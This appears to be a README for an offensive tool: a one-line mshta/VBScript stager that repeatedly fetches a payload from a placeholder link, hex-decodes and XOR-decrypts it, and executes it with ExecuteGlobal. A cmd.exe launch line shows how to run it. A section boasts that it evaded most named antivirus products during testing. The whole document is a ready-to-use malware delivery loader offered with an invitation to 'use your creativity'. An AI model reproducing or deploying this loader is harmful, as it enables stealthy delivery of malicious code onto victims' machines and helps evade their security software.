# MSHTA VBScript Download & Execute
Downloads, decode, decrypt and executes a VBScript using cmd and mshta
```
'=========================================='
'                 Features                 '  
'++++++++++++++++++++++++++++++++++++++++++'
' [*] Autoreconnect                        '
' [*] Hexadecimal encoded payload (UTF8)   '
' [*] Encrypted payload                    '
' [*] In (**almost) memory execution       '
'++++++++++++++++++++++++++++++++++++++++++'
'<---------------------------------------->'
'<========================================>'
'<---------------------------------------->'
'mshta.exe one line command                '
'mshta.exe maximum command length   : 487  '
'Script length with double quotes   : 330  '
'<---------------------------------------->'
'=========================================='

**mshta.exe will save in a temp file your decrypted payload and after the execution the temp file will be deleted
```
## One line command
```
"On Error Resume Next:Set a=CreateObject(""MSXML2.ServerXMLHTTP.6.0""):a.setOption 2,13056:while(Len(b)=0):a.open""GET"",""LINK_TO_YOUR_PAYLOAD"",False:a.send:b=a.responseText:wend:k=""PAYLOAD_DECRYPT_KEY"":for i=0to Len(b)-1Step 2:c=c&Chr(Asc(Chr(""&H""&Mid(b,i+1,2)))xor Asc(Mid(k,((i/2)mod Len(k))+1,1))):Next:ExecuteGlobal c:"
```

## Example
```
(cmd.exe): mshta vbscript:execute("ONE LINE COMMAND")(window.close)
```
![Alt Text](https://i.imgur.com/5bjSQAY.gif)
</br>
[ScreenToGif](https://github.com/NickeManarin/ScreenToGif)

## Evasion Test
Tested on **Windows7/10** x64 with: *Avira*, *AVG*, *Avast*, *ESET32*, *Kaspersky*, *Panda*, *BitDefender* and *Windows Defender* (Win7/10) to launch a more *expansive malicous payload*, the only one who blocked was **BitDefender**.

## Use your creativity ;)
